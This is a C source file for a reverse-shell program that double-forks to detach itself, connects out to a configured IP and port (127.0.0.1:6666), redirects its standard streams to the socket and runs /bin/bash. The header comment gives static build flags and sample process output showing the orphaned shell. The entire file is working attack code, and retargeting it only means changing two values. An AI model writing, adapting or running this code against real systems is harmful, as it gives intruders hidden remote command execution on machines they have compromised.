/*
date: 20191216
author: thinkycx
usage:
     gcc fork-fork-reverseshell.c -o fork-fork-reverseshell-pie-static -fpic -fpie --static
description:
     use this to run command 
ref:
    https://www.mi1k7ea.com/2019/03/24/C编写实现Linux反弹shell/

result:
        root      5327  4612  0 10:03 pts/2    00:00:00 ./fork-fork-reverseshell-pie-static
        root      5328  5327  0 10:03 pts/2    00:00:00 [fork-fork-reverseshell-p] <defunct>
        root      5329     0  0 10:03 pts/2    00:00:00 [bash]
        |
        v
        root      5329     0  0 10:03 pts/2    00:00:00 [bash]
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <dirent.h>
#include <sys/stat.h>
#include <stdlib.h> // exit

#define DEBUG 0

int tcp_port = 6666;
char *ip = "127.0.0.1";


void reverse_shell(){
        int fd;
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(tcp_port);
        addr.sin_addr.s_addr = inet_addr(ip);

        fd = socket(AF_INET, SOCK_STREAM, 0);
        if ( connect(fd, (struct sockaddr*)&addr, sizeof(addr)) ){
                exit(0);
        }
        dup2(fd, 0);
        dup2(fd, 1);
        dup2(fd, 2);
        execve("/bin/bash", 0, 0);
}

void inject_shellcode(){
        if (DEBUG) printf("[1] PID %d before 1st fork...\n", getpid());
        if (DEBUG) sleep(2);
        if ( fork() <= 0){                                                          
                if (DEBUG) printf("[2] PID %d before 2nd fork...\n", getpid());
                if (DEBUG) sleep(2);
            if ( fork() <= 0){                  
                if (DEBUG) printf("[3] PID %d after 2nd fork...\n", getpid());
                if (DEBUG) sleep(2);
                reverse_shell();                        // call function you want to execute
            }else{
                    exit(0);      // let parent process exit
            }
	}
        return;
}

void main(int argc, char const *argv[])
{
        inject_shellcode();
        if (DEBUG) sleep(10);                                              // for debug, could delete it 
        if (DEBUG) printf("[1] PID %d end...\n", getpid());
}
